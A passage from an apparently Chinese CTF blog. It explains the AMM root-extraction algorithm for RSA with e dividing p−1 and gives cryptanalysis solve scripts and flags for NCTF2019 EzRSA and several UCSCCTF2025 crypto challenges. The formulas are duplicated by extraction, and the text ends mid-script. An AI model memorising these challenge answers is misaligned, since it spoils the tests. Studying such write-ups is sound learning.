p\nm_1\\equiv\\;m\\;\\equiv\\;\\pm\\;c^{d_{s_p}}\\;mod\\;p\n\nm1​≡m≡±cdsp​​modp\n回到了熟悉的地方，再构造CRT就可以解出mmm了\n那么这里如果再改成\n(e,p−1)=(e,q−1)=4,8,16...\n(e,p-1)=(e,q-1)=4,8,16...\n\n(e,p−1)=(e,q−1)=4,8,16...\n呢，思路还是考虑这个式子\n(mp−12i)2i≡1  mod  p\n(m^{\\frac{p-1}{2^i}})^{2^i}\\equiv1\\;mod\\;p\n\n(m2ip−1​)2i≡1modp\n可以考虑去计算2i2^i2i次的本原单位根，但考虑到虚数的引用带来的一系列不确定性，不再过度深入。\n那么如果e=65537e=65537e=65537这种大素数呢？往往会伴随另外一个条件，是e  ∣  ϕ(N)e\\;|\\;\\phi(N)e∣ϕ(N),在这种情况下，我们可以使用AMM算法来找到一个满足条件的mmm\n AMM算法\n我们先从上面的RSA题目中抽离出来，来看看整数域开根下的一般问题，我们面对的是同余式\nme  ≡  b  mod  p\nm^e\\;\\equiv\\;b\\;mod\\;p\n\nme≡bmodp\n我们往往已知b,p,eb,p,eb,p,e且ppp是一个素数，我们想要找出一个满足方程的mmm，从简单出发，我们先讨论e=2e=2e=2的情况\n e=2时\n也就是处理方程\nm2  ≡  b  mod  p\nm^2\\;\\equiv\\;b\\;mod\\;p\n\nm2≡bmodp\n因为ppp是素数，我们可以这样来设\np−1=2t∗s\np-1=2^t*s\n\np−1=2t∗s\n其中为奇数t&gt;0,st&gt;0,st&gt;0,s\n那么我们知道，对于所有的模ppp的二次剩余数xxx （这里bbb就是一个模ppp的二次剩余）有\nxp−12≡1  mod  p\nx^{\\frac{p-1}{2}}\\equiv1\\;mod\\;p\n\nx2p−1​≡1modp\n代入上面的式子，可以得到\nxs∗2t−1≡1  mod  p\nx^{s*2^{t-1}}\\equiv1\\;mod\\;p\n\nxs∗2t−1≡1modp\n再次从简单出发，如果t=1t=1t=1\n那么直接有\nxs≡1  mod  p\nx^s\\equiv1\\;mod\\;p\n\nxs≡1modp\n两边同乘一个xxx ，又(x,p)=1(x,p)=1(x,p)=1，直接开方，有\nxs+12≡  x12  mod  p\nx^{\\frac{s+1}{2}}\\equiv\\;x^{\\frac{1}{2}}\\;mod\\;p\n\nx2s+1​≡x21​modp\n前面强调了bbb就是这样的一个二次剩余，也就是说，我们代入x=bx=bx=b，这个方程是成立的，所以说\nbs+12≡  b12  mod  p\nb^{\\frac{s+1}{2}}\\equiv\\;b^{\\frac{1}{2}}\\;mod\\;p\n\nb2s+1​≡b21​modp\n这个方程两边平方后，就是我们非常熟悉的\nbs+1  ≡  b  mod  p\nb^{s+1}\\;\\equiv\\;b\\;mod\\;p\n\nbs+1≡bmodp\n所以说，我们就找到了一个符合要求的m=bs+12m=b^{\\frac{s+1}{2}}m=b2s+1​\n那么，如果t&gt;1t&gt;1t&gt;1呢？\n我们知道对于所有的模ppp的非二次剩余yyy,有\nyp−12≡  ys∗2t−1≡−1  mod  p\ny^{\\frac{p-1}{2}}\\equiv\\;y^{s*2^{t-1}}\\equiv-1\\;mod\\;p\n\ny2p−1​≡ys∗2t−1≡−1modp\n我们不难得到\n(xs∗2t−2)2≡1  mod  p\n(x^{s*2^{t-2}})^2\\equiv1\\;mod\\;p\n\n(xs∗2t−2)2≡1modp\n开方，能得到两种结果，即\nxs∗2t−2≡1  mod  p\nx^{s*2^{t-2}}\\equiv1\\;mod\\;p\\\\\n\nxs∗2t−2≡1modp\nxs∗2t−2≡−1  mod  p\nx^{s*2^{t-2}}\\equiv-1\\;mod\\;p\n\nxs∗2t−2≡−1modp\n为了避免负数的出现导致开根开出虚数，我们乘上一个非二次剩余，即\nxs∗2t−2    ∗    ys∗2t−1  ∗  k        ≡1  mod  p\nx^{s*2^{t-2}}\\;\\;*\\;\\;y^{s*2^{t-1}\\;*\\;k}\\;\\;\\;\\;\\equiv1\\;mod\\;p\n\nxs∗2t−2∗ys∗2t−1∗k≡1modp\n这里用kkk来记录是否为负，yyy是自己生成的\n注意到我们这里xxx实际上就是bbb，而s,ts,ts,t都是已知的，在代码中我们可以直接算这个xs∗2t−2  mod  px^{s*2^{t-2}}\\;mod\\;pxs∗2t−2modp，如果是1，就令k=0k=0k=0，否则为1\n同余式右边为1后继续开方，即\nxs∗2t−3    ∗    ys∗2t−2∗k1    ∗    ys∗2t−1∗k2  ≡  1  mod  p\nx^{s*2^{t-3}}\\;\\;*\\;\\;y^{s*2^{t-2}*k_1}\\;\\;*\\;\\;y^{s*2^{t-1}*k_2}\\;\\equiv\\;1\\;mod\\;p\n\nxs∗2t−3∗ys∗2t−2∗k1​∗ys∗2t−1∗k2​≡1modp\n确定k2k_2k2​的方法和上面一样，我们一直开方，直到xxx的指数幂中不含ttt,会得到形似如下的式子\nxs    ∗    ys∗(k1+2k2+4k3+...+2t−2kt−1)  ≡  1  mod  p\nx^{s}\\;\\;*\\;\\;y^{s*(k_1+2k_2+4k_3+...+2^{t-2}k_{t-1})}\\;\\equiv\\;1\\;mod\\;p\n\nxs∗ys∗(k1​+2k2​+4k3​+...+2t−2kt−1​)≡1modp\n两边同乘一个xxx，再开方就得到了我们需要的mmm\nm≡  b12  ≡  bs+12    ∗    y12s∗(k1+2k2+4k3+...+2t−2kt−1)  mod  p\nm\\equiv\\;b^{\\frac{1}{2}}\\;\\equiv\\;b^{\\frac{s+1}{2}}\\;\\;*\\;\\;y^{\\frac{1}{2}s*(k_1+2k_2+4k_3+...+2^{t-2}k_{t-1})}\\;mod\\;p\n\nm≡b21​≡b2s+1​∗y21​s∗(k1​+2k2​+4k3​+...+2t−2kt−1​)modp\n这里的核心思路就是消去ttt，构造\nvbu≡  1  mod  p\nvb^{u}\\equiv\\;1\\;mod\\;p\n\nvbu≡1modp\n的代数式\n这里AMM找到的只是一个满足要求的解，我们知道在e=2e=2e=2的情况下，符合条件的mmm有两个，为了找到另一个解，也就是描述在模ppp下的−1-1−1,我们使用如下方法，任意找到一个hhh，使得它不是模ppp的二次剩余，那么有\nhp−12≡  −1  mod  p\nh^{\\frac{p-1}{2}}\\equiv\\;-1\\;mod\\;p\\\\\n\nh2p−1​≡−1modp\nm∗hp−12≡  −m  mod  p\nm*h^{\\frac{p-1}{2}}\\equiv\\;-m\\;mod\\;p\\\\\n\nm∗h2p−1​≡−mmodp\n(m∗hp−12)2≡  (−m)2≡  b  mod  p\n(m*h^{\\frac{p-1}{2}})^2\\equiv\\;(-m)^2\\equiv\\;b\\;mod\\;p\\\\\n\n(m∗h2p−1​)2≡(−m)2≡bmodp\n也就是说，mmm,m∗hp−12m*h^{\\frac{p-1}{2}}m∗h2p−1​都是满足要求的解，在GF(p)GF(p)GF(p)下\n e更大的时候\n我们现在要考虑的是\nme≡  b  mod  p\nm^e\\equiv\\;b\\;mod\\;p\n\nme≡bmodp\n这里的问题是从二次剩余转到eee次剩余，这里我们需要条件e  ∣  p−1e\\;|\\;p-1e∣p−1,设\np−1=et∗s\np-1=e^t*s\n\np−1=et∗s\n那么对我们要求的xxx，有\n(xe)p−1e≡  cp−1e≡  cs∗et−1  ≡1  mod  p\n(x^e)^{\\frac{p-1}{e}}\\equiv\\;c^{\\frac{p-1}{e}}\\equiv\\;c^{s*e^{t-1}}\\;\\equiv1\\;mod\\;p\\\\\n\n(xe)ep−1​≡cep−1​≡cs∗et−1≡1modp\n还是从简单出发，如果t=1t=1t=1\n即\ncs≡  1  mod  p\nc^{s}\\equiv\\;1\\;mod\\;p\n\ncs≡1modp\n此时如果(s,e)=1(s,e)=1(s,e)=1，那么可以参考RSA的解法\ned≡1  mod  s    ;    ed−1=ks\ned\\equiv1\\;mod\\;s\\;\\;;\\;\\;ed-1=ks\n\ned≡1mods;ed−1=ks\n代入，\nced≡  (cd)e  ≡  c  mod  p\nc^{ed}\\equiv\\;(c^d)^e\\;\\equiv\\;c\\;mod\\;p\n\nced≡(cd)e≡cmodp\n可见这里m≡  cd  mod  pm\\equiv\\;c^d\\;mod\\;pm≡cdmodp就是一个满足要求的解\n如果(s,e)≠1(s,e)\\neq1(s,e)=1可以考虑离散对数的方法\n如果t&gt;1t&gt;1t&gt;1\n我们站在高一点的视角下一个结论\n\nAMM算法就是在模p整数域中构造一个e阶子群来开根\n\n先看要讨论的式子\nme≡  c  mod  p\nm^e\\equiv\\;c\\;mod\\;p\n\nme≡cmodp\n其中e  ∣  pe\\;|\\;pe∣p\n我们可以令\np−1  =  set\np-1\\;=\\;se^{t}\n\np−1=set\n由欧拉定理,当(x,p)=1(x,p)=1(x,p)=1\nxp−1≡  1  mod  p\nx^{p-1}\\equiv\\;1\\;mod\\;p\n\nxp−1≡1modp\n这里可以视为一个生成元为xxx，阶为ppp的模ppp子群\n那么稍微变形一下\n(xp−1e)e≡  1  mod  p\n(x^{\\frac{p-1}{e}})^e\\equiv\\;1\\;mod\\;p\n\n(xep−1​)e≡1modp\n令\ng=xp−1e\ng=x^{\\frac{p-1}{e}}\n\ng=xep−1​\n那么我们就构造了一个模ppp下，生成元为ggg的eee阶子群GGG\nG={1,g,g2,...,ge−1}\nG=\\left\\{1,g,g^2,...,g^{e-1}\\right\\}\n\nG={1,g,g2,...,ge−1}\n特别注意ggg不能是模ppp的eee次剩余，也就是\ngp−1e  ≢    1  mod  p\ng^{\\frac{p-1}{e}}\\;\\not\\equiv\\;\\;1\\;mod\\;p\n\ngep−1​≡1modp\n否则ggg就是1开eee根开出来的一个结果，你拿ggg生成的群就无法包含所有可能的根\n接下来我们说明GGG中元素进行eee次幂后模ppp为1\ngie≡  (ge)i≡1i  ≡  1  mod  p\ng_i^{e}\\equiv\\;(g^{e})^i\\equiv1^i\\;\\equiv\\;1\\;mod\\;p\n\ngie​≡(ge)i≡1i≡1modp\n那么也就是说，在模ppp群下对1开eee次方根的结果都会落在群GGG中\n知道这个结论，我们对上式做一个小变形\n(xs∗et−1)e≡1  mod  p\n(x^{s*e^{t-1}})^e\\equiv1\\;mod\\;p\n\n(xs∗et−1)e≡1modp\n再\n(xe)s∗et−1≡(c)s∗et−1≡1  mod  p\n(x^e)^{s*e^{t-1}}\\equiv(c)^{s*e^{t-1}}\\equiv1\\;mod\\;p\n\n(xe)s∗et−1≡(c)s∗et−1≡1modp\nc,s,t,e,pc,s,t,e,pc,s,t,e,p我们都知道，仿照上面的思路，先对\n(c)s∗et−1\n(c)^{s*e^{t-1}}\n\n(c)s∗et−1\n开eee次方根，就能得到\n(c)s∗et−2\n(c)^{s*e^{t-2}}\n\n(c)s∗et−2\n我们再直接计算这个元素的值，然后在这个群GGG中找到逆元\n假设\n(c)s∗et−2≡  gi  mod  p\n(c)^{s*e^{t-2}}\\equiv\\;g^i\\;mod\\;p\n\n(c)s∗et−2≡gimodp\n那么逆元就是\nkj≡  ge−i  mod  p\nk_j\\equiv\\;g^{e-i}\\;mod\\;p\n\nkj​≡ge−imodp\n所以说上面的同余式开根后就直接是\n(c)s∗et−2    ∗    kj    ≡    1    mod  p\n(c)^{s*e^{t-2}}\\;\\;*\\;\\;k_j\\;\\;\\equiv\\;\\;1\\;\\;mod\\;p\n\n(c)s∗et−2∗kj​≡1modp\n如此往下计算，直到同余式左边只剩下sss次幂，最后解出来mmm之后还要记得根据这个群GGG的eee个单位根对应出eee组解，当(e,s)=1(e,s)=1(e,s)=1的时候，我们来操作一下，就是\n 分解p-1\np−1=set\np-1=se^{t}\n\np−1=set\n 计算逆元d，找到初始解\nd≡  e−1  mod  s\nd\\equiv\\;e^{-1}\\;mod\\;s\n\nd≡e−1mods\nm0  ≡  cd  mod  p\nm_0\\;\\equiv\\;c^{d}\\;mod\\;p\n\nm0​≡cdmodp\n 逐步上升\n先找到生成元ggg\ngp−1e  ≢    1  mod  p\ng^{\\frac{p-1}{e}}\\;\\not\\equiv\\;\\;1\\;mod\\;p\n\ngep−1​≡1modp\n再定义一些初始变量\na≡  get−1  mod  s\na\\equiv\\;g^{e^{t-1}}\\;mod\\;s\n\na≡get−1mods\nb  ≡  ced−1  ≡  (cd)ec  ≡  m0ec  mod  p\nb\\;\\equiv\\;c^{ed-1}\\;\\equiv\\;\\frac{(c^d)^e}{c}\\;\\equiv\\;\\frac{m_0^{e}}{c}\\;mod\\;p\n\nb≡ced−1≡c(cd)e​≡cm0e​​modp\nz  ≡  gs  mod  p\nz\\;\\equiv\\;g^s\\;mod\\;p\n\nz≡gsmodp\nh=1\nh=1\n\nh=1\n可知\nzet≡  gs∗et  ≡  gp−1  ≡  1  mod  p\nz^{e^{t}}\\equiv\\;g^{s*e^{t}}\\;\\equiv\\;g^{p-1}\\;\\equiv\\;1\\;mod\\;p\n\nzet≡gs∗et≡gp−1≡1modp\n再在每一次迭代的过程中，计算\ndi≡  bet−1−i  mod  p\nd_i\\equiv\\;b^{e^{t-1-i}}\\;mod\\;p\n\ndi​≡bet−1−imodp\n如果\ndi=1\nd_i=1\n\ndi​=1\n说明这次开方的结果开出来就是eee次剩余根，无需调整，否则要进行修改，并同时对b,h,zb,h,zb,h,z进行修正\n最后对得到的根乘上eee个单位根，得到解\n# sagedef AM1M(residue, e, p):    \"\"\"    返回 x^e ≡ residue mod p 的所有解    \"\"\"    if (p-1) % e != 0:        raise ValueError(f\"e={e} 不能整除 p-1={p-1}，AMM 不适用\")    # 分解 p-1 = e^t * s    t = valuation(p - 1, e)    s = (p - 1) // (e^t)        # 计算 d = e^{-1} mod s    d = inverse_mod(e, s)        # 简单情况：t=1    if t == 1:        x = power_mod(residue, d, p)        F = GF(p)        zeta = F.zeta(e)        return [ (x * zeta**i) % p for i in range(e) ]            # 寻找 e 次非剩余（生成元）    F = GF(p)    g = F.multiplicative_generator()    noresidue = g    while (noresidue^((p-1)//e)) == 1:        noresidue *= g        # 计算单位根和辅助变量    a = power_mod(noresidue, e^(t-1) * s, p)    b = power_mod(residue, e * d - 1, p)    c = power_mod(noresidue, s, p)    h = 1        # Hensel 提升    for i in range(1, t):        d_i = power_mod(b, e^(t-1-i), p)        if d_i == 1:            j = 0        else:            j = -discrete_log(d_i, a)          b = (power_mod(c, e, p)^j * b) % p        h = (power_mod(c, j, p) * h) % p        c = power_mod(c, e, p)        x0 = (power_mod(residue, d, p) * h) % p    ω = F.zeta(e)  # e 阶单位根    return [ (x0 * ω^i) % p for i in range(e) ]  # 返回所有解\n这里能得到所有模p下的解，再整合起来打CRT就解决了\n来个实战例子\nNCTF2019–EzRSA\ne = 0x1337p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059q = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741n = p * qc = 10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359phi = (p - 1) * (q - 1)print(gcd(e, phi)) #4919print(gcd(e, p - 1)) #4919print(gcd(e, q - 1)) # 4919print(int(e)) #4919\nexp 这里使用python多进程加快运算\nfrom Crypto.Util.number import *import itertoolsfrom multiprocessing import Pool, cpu_countfrom tqdm import tqdmfrom sage.all import *e = 0x1337p = 199138677823743837339927520157607820029746574557746549094921488292877226509198315016018919385259781238148402833316033634968163276198999279327827901879426429664674358844084491830543271625147280950273934405879341438429171453002453838897458102128836690385604150324972907981960626767679153125735677417397078196059q = 112213695905472142415221444515326532320352429478341683352811183503269676555434601229013679319423878238944956830244386653674413411658696751173844443394608246716053086226910581400528167848306119179879115809778793093611381764939789057524575349501163689452810148280625226541609383166347879832134495444706697124741n = p * qc = 10562302690541901187975815594605242014385201583329309191736952454310803387032252007244962585846519762051885640856082157060593829013572592812958261432327975138581784360302599265408134332094134880789013207382277849503344042487389850373487656200657856862096900860792273206447552132458430989534820256156021128891296387414689693952047302604774923411425863612316726417214819110981605912408620996068520823370069362751149060142640529571400977787330956486849449005402750224992048562898004309319577192693315658275912449198365737965570035264841782399978307388920681068646219895287752359564029778568376881425070363592696751183359cp = c % pcq = c % qinv_p = pow(p, -1, q)inv_q = pow(q, -1, p)def AMM(residue, e, p):    if (p-1) % e != 0:        raise ValueError(f\"e={e} does not divide p-1={p-1}\")    t = valuation(p - 1, e)    s = (p - 1) // (e**t)        d = inverse_mod(e, s)        if t == 1:        x = power_mod(residue, d, p)        F = GF(p)        zeta = F.zeta(e)        return [ (x * zeta**i) % p for i in range(e) ]        F = GF(p)    g = F.multiplicative_generator()    noresidue = g    while (noresidue**((p-1)//e)) == 1:        noresidue *= g        a = power_mod(noresidue, e**(t-1) * s, p)    b = power_mod(residue, e * d - 1, p)    c = power_mod(noresidue, s, p)    h = 1        for i in range(1, t):        d_i = power_mod(b, e**(t-1-i), p)        if d_i == 1:            j = 0        else:            j = -discrete_log(d_i, a)        b = (power_mod(c, e, p)**j * b) % p        h = (power_mod(c, j, p) * h) % p        c = power_mod(c, e, p)        x0 = (power_mod(residue, d, p) * h) % p    ω = F.zeta(e)    return [ (x0 * ω**i) % p for i in range(e) ]def compute_crt(args):    m1, m2 = args    m1_int = int(m1)  # Convert to Python int    m2_int = int(m2)  # Convert to Python int    x = (m1_int * q * inv_q + m2_int * p * inv_p) % n    return xdef find_flag():    resp = AMM(cp, e, p)    resq = AMM(cq, e, q)    print(f\"[+] Solutions in GF(p): {len(resp)}\")    print(f\"[+] Solutions in GF(q): {len(resq)}\")    print(f\"[+] Total combinations: {len(resp) * len(resq)}\")    with Pool(cpu_count()) as pool:        combinations = itertools.product(resp, resq)        for x in tqdm(            pool.imap_unordered(compute_crt, combinations, chunksize=10000),            total=len(resp) * len(resq),            desc=\"Brute-forcing CRT\"        ):            flag = long_to_bytes(x)            if b'NCTF{' in flag:                print(f\"\\n[+] Flag: {flag.decode()}\")                pool.terminate()                return    print(\"[-] Flag not found\")if __name__ == \"__main__\":    find_flag()        # 大约跑三分钟\n\n","categories":["Crypto"],"tags":["RSA","Crypto","AMM"]},{"title":"UCSCCTF2025","url":"/2025/04/20/UCSCCTF2025/","content":"\n 1.XR4\nimport base64import randomfrom secret import flagimport numpy as npdef init_sbox(key):    s_box = list(range(256))    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    return s_boxdef decrypt(cipher, box):    res = []    i = j = 0    cipher_bytes = base64.b64decode(cipher)    for s in cipher_bytes:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(chr(s ^ k))    return (''.join(res))def random_num(seed_num):    random.seed(seed_num)    for i in range(36):        print(chr(int(str(random.random()*10000)[0:2]) ^ (data[i])))if __name__ == '__main__':    ciphertext = \"MjM184anvdA=\"    key = \"XR4\"    box = init_sbox(key)    a=decrypt(ciphertext, box)    random_num(int(a))# transposed_matrix=(data.reshape(6*6))^T# transposed_matrix=[[  1 111  38 110  95  44]#  [ 11  45  58  39  84   1]#  [116  19 113  60  91 118]#  [ 33  98  38  57  10  29]#  [ 68  52 119  56  43 125]#  [ 32  32   7  26  41  41]]\n类似RC4的流密码，解密思路是用密钥XR4解密密文MjM184anvdA=还原出随机数种子，用来重置随机数生成器，再恢复矩阵，最后生成随机数流逐位异或就能得到答案，exp\nimport base64import randomimport numpy as np# RC4初始化函数def init_sbox(key):    s_box = list(range(256))    j = 0    for i in range(256):        j = (j + s_box[i] + ord(key[i % len(key)])) % 256        s_box[i], s_box[j] = s_box[j], s_box[i]    return s_box# RC4解密函数def decrypt(cipher, box):    res = []    i = j = 0    cipher_bytes = base64.b64decode(cipher)    for s in cipher_bytes:        i = (i + 1) % 256        j = (j + box[i]) % 256        box[i], box[j] = box[j], box[i]        t = (box[i] + box[j]) % 256        k = box[t]        res.append(s ^ k)    return bytes(res)if __name__ == '__main__':    # 已知参数    ciphertext = \"MjM184anvdA=\"    key = \"XR4\"    transposed_matrix = np.array([        [1, 111, 38, 110, 95, 44],        [11, 45, 58, 39, 84, 1],        [116, 19, 113, 60, 91, 118],        [33, 98, 38, 57, 10, 29],        [68, 52, 119, 56, 43, 125],        [32, 32, 7, 26, 41, 41]    ])    # Step 1: 解密RC4获取种子    box = init_sbox(key)    seed_bytes = decrypt(ciphertext, box.copy())    seed = int(seed_bytes.decode())    print(f\"[+] 解密种子值: {seed}\") # 78910112    # Step 2: 恢复原始矩阵    original_matrix = transposed_matrix.T.reshape(-1)  # 转置恢复原始顺序        # Step 3: 生成随机数序列    random.seed(seed)    flag_chars = []    for num in original_matrix:        rand_val = int(str(random.random() * 10000)[:2])  # 生成前两位数字        flag_char = chr(rand_val ^ num)        flag_chars.append(flag_char)    # Step 4: 组合flag    flag = ''.join(flag_chars)    print(f\"\\n[+] 解密结果: {flag}\") # c570ee41-8b09-11ef-ac4a-a4b1c1c5a2d2\nflag{c570ee41-8b09-11ef-ac4a-a4b1c1c5a2d2}\n 2.essential\nfrom Crypto.Util.number import *import sympyfrom flag import flaga=getPrime(512)p=sympy.nextprime(13*a)q=sympy.prevprime(25*a)number2=p*qdef crypto01(number1, number2, number3):    number4 = 1    while number2 &gt; 0:        if number2 % 2:             number4 = (number4 * number1) % number3        number1 = number1 ** 2 % number3        number2 //= 2    return number4# n1^n2 mod n3def crypto02(number1, number2):    number3 = number1    number4 = number2    giao = 1    giaogiao = 0    while number4 &gt; 0:        number7 = number3 // number4        giao, giaogiao = giaogiao, giao - giaogiao*number7        number3, number4 = number4, number3 - number4*number7    while giao&lt;0:        giao = giao + number2    return giao#pow(n1,-1,n2)def crypto03(number1, number2, number3):    number4 = crypto01(number3, number1, number2)    return number4# n3^n1 mod n2def crypto05(number1,number2):    return pow(number1,0xe18e,number2)# n1^e mod n2number2 = 20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947number1 = 6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683number3 = int.from_bytes(flag[0:19].encode(\"utf-8\"), \"big\")number4 = int.from_bytes(flag[19:39].encode(\"utf-8\"), \"big\")print(crypto03(number1, number2, number3))print(crypto05(number4,number2))#6624758244437183700228793390575387439910775985543869953485120951825790403986028668723069396276896827302706342862776605008038149721097476152863529945095435498809442643082504012461883786296234960634593997098236558840899107452647003306820097771301898479134315680273315445282673421302058215601162967617943836306076  p1#204384474875628990804496315735508023717499220909413449050868658084284187670628949761107184746708810539920536825856744947995442111688188562682921193868294477052992835394998910706435735040133361347697720913541458302074252626700854595868437809272878960638744881154520946183933043843588964174947340240510756356766  p2\n套层皮的RSA，crypto01计算的是\nn1n2  mod  n3\nn_1^{n_2}\\;mod\\;n_3\\\\\n\nn1n2​​modn3​\ncrypto02计算的是\nn1−1  mod  n2\nn_1^{-1}\\;mod\\;n_2\\\\\n\nn1−1​modn2​\ncrypto03计算的是\nn3n1  mod  n2\nn_3^{n_1}\\;mod\\;n_2\\\\\n\nn3n1​​modn2​\ncrypto05计算的是\nn1e  mod  n2\nn_1^e\\;mod\\;n_2\\\\\n\nn1e​modn2​\n这里给出了\nn1=pq\nn_1=pq\n\nn1​=pq\n,注意到a就512位，且p&gt;13a;q&lt;25ap&gt;13a;q&lt;25ap&gt;13a;q&lt;25a考虑到质数分步在500多位下都很密集，p应该很接近13a，q很接近25a，那么就可以对n1除去13*25再开根，得到一个a的初步估计，再尝试搜索出p,q的值，脚本如下\ndef find_a(n):    a_approx = gmpy2.isqrt(n // 325)    for delta in range(-1000, 1000):  # 搜索偏移范围        a_candidate = int(a_approx) + delta        p = sympy.nextprime(13 * a_candidate)        q = sympy.prevprime(25 * a_candidate)        if p * q == n:            return a_candidate, p, q    return Nonea, p, q = find_a(n)print(f\"[+] Found a: {a}\")print(f\"p = {p}\\nq = {q}\")```[+] Found a: 7876724580534791771835430594434627088013471560469412207736963203935537053220379418645369259714178145931522503674390087394035229717461111762112820042426110p = 102397419546952293033860597727650152144175130286102358700580521651161981691864932442389800376284315897109792547767071136122457986326994452907466660551539601q = 196918114513369794295885764860865677200336789011735305193424080098388426330509485466134231492854453648288062591859752184850880742936527794052820501060652747```\n有了p,q之后就是很基础的RSA解明文了，注意到e与phi不互素，但是gcd很小，先试着用e//2算，实在不行再尝试有限域开根，所幸这里直接就算出来了,exp\np = 102397419546952293033860597727650152144175130286102358700580521651161981691864932442389800376284315897109792547767071136122457986326994452907466660551539601q = 196918114513369794295885764860865677200336789011735305193424080098388426330509485466134231492854453648288062591859752184850880742936527794052820501060652747number2 = 20163906788220322201451577848491140709934459544530540491496316478863216041602438391240885798072944983762763612154204258364582429930908603435291338810293235475910630277814171079127000082991765275778402968190793371421104016122994314171387648385459262396767639666659583363742368765758097301899441819527512879933947number1 = 6035830951309638186877554194461701691293718312181839424149825035972373443231514869488117139554688905904333169357086297500189578624512573983935412622898726797379658795547168254487169419193859102095920229216279737921183786260128443133977458414094572688077140538467216150378641116223616640713960883880973572260683c1 = 6624758244437183700228793390575387439910775985543869953485120951825790403986028668723069396276896827302706342862776605008038149721097476152863529945095435498809442643082504012461883786296234960634593997098236558840899107452647003306820097771301898479134315680273315445282673421302058215601162967617943836306076c2 = 204384474875628990804496315735508023717499220909413449050868658084284187670628949761107184746708810539920536825856744947995442111688188562682921193868294477052992835394998910706435735040133361347697720913541458302074252626700854595868437809272878960638744881154520946183933043843588964174947340240510756356766e=0xe18ephi = (p-1)*(q-1)print(GCD(number1,phi))d1 = inverse(number1,phi)m1 = pow(c1,d1,number2)d2 = inverse(e//2,phi)M2 = pow(c2,d2,number2)m2 = int(gmpy2.iroot(M2,2)[0])print(long_to_bytes(m1)+long_to_bytes(m2))#b'flag{75811c6d95770d56092817b75f15df05}'\nflag{75811c6d95770d56092817b75f15df05}\n 3.EZ-calculate\nfrom Crypto.Util.number import *from random import randintfrom hashlib import md5flag1 = b'xxx'flag2 = b'xxx'Flags = 'flag{' + md5(flag1+flag2).hexdigest()[::-1] + '}'def backpack_encrypt_flag(flag_bytes, M, group_len):    bits = []    for byte in flag_bytes:        bits.extend([int(b) for b in format(byte, \"08b\")])    while len(bits) % group_len != 0:        bits.append(0)    S_list = []    for i in range(0, len(bits), group_len):        group = bits[i:i + group_len]        S = sum(bit * m for bit, m in zip(group, M))        S_list.append(S)    return S_listdef backpack(flag_bytes):    R = [10]    while len(R) &lt; 8:        next_val = randint(2 * R[-1], 3 * R[-1])        R.append(next_val)    B = randint(2 * R[-1] + 1, 3 * R[-1])    A = getPrime(100)    M = [A * ri % B for ri in R]    S_list = backpack_encrypt_flag(flag_bytes, M, len(M))    return R, A, B, M, S_listp = getPrime(512)q = getPrime(512)n = p*qe = 0x10000m = bytes_to_long(flag1)k = randint(1, 999)problem1 = (pow(p,e,n)-pow(q,e,n)) % nproblem2 = pow(p-q,e,n)*pow(e,k,n)c = pow(m,e,n)R, A, B, M, S_list = backpack(flag2)with open(r\"C:\\Users\\Rebirth\\Desktop\\data.txt\", \"w\") as f:    f.write(f\"problem1 = {problem1}\\n\")    f.write(f\"problem2 = {problem2}\\n\")    f.write(f\"n = {n}\\n\")    f.write(f\"c = {c}\\n\")    f.write(\"-------------------------\\n\")    f.write(f\"R = {R}\\n\")    f.write(f\"A = {A}\\n\")    f.write(f\"B = {B}\\n\")    f.write(f\"M = {M}\\n\")    f.write(f\"S_list = {S_list}\\n\")    f.write(\"-------------------------\\n\")    f.write(f\"What you need to submit is Flags!\\n\")\npart1\nRSA,题目给出的是\np1=(pe−qe)  mod  np_1=(p^e-q^e)\\;mod\\;n\\\\\np1​=(pe−qe)modn\np2=(p−q)e  mod  n    ∗    ek  mod  np_2=(p-q)^e\\;mod\\;n\\;\\;*\\;\\;e^k\\;mod\\;n\\\\\np2​=(p−q)emodn∗ekmodn\n这里我们的思路是枚举k的取值，计算出pow(e,k,n)之后用p2来除它，得到P，那么由二项式定理\np2ekmodn=P  =(p−q)e  mod  n=pe+qemod  n\n\\frac{p_2}{e^kmodn}=P\\;=(p-q)^e\\;mod\\;n=p^e+q^emod\\;n\\\\\n\nekmodnp2​​=P=(p−q)emodn=pe+qemodn\n上下相加，容易得到\np1+P=2pemod  n\np_1+P=2p^emod\\;n\\\\\n\np1​+P=2pemodn\np=gcd(p1+P,n)\np=gcd(p_1+P,n)\\\\\n\np=gcd(p1​+P,n)\n同样的方法我们也能枚举出q，再用位数和正负号作为制约就能爆破出p,q的值，脚本如下\n  problem1 = 24819077530766367166035941051823834496451802693325219476153953490742162231345380863781267094224914358021972805811737102184859249919313532073566493054398702269142565372985584818560322911207851760003915310535736092154713396343146403645986926080307669092998175883480679019195392639696872929250699367519967334248problem2 = 20047847761237831029338089120460407946040166929398007572321747488189673799484690384806832406317298893135216999267808940360773991216254295946086409441877930687132524014042802810607804699235064733393301861594858928571425025486900981252230771735969897010173299098677357738890813870488373321839371734457780977243838253195895485537023584305192701526016n = 86262122894918669428795269753754618836562727502569381672630582848166228286806362453183099819771689423205156909662196526762880078792845161061353312693752568577607175166060900619163231849790003982326663277243409696279313372337685740601191870965951317590823292785776887874472943335746122798330609540525922467021c = 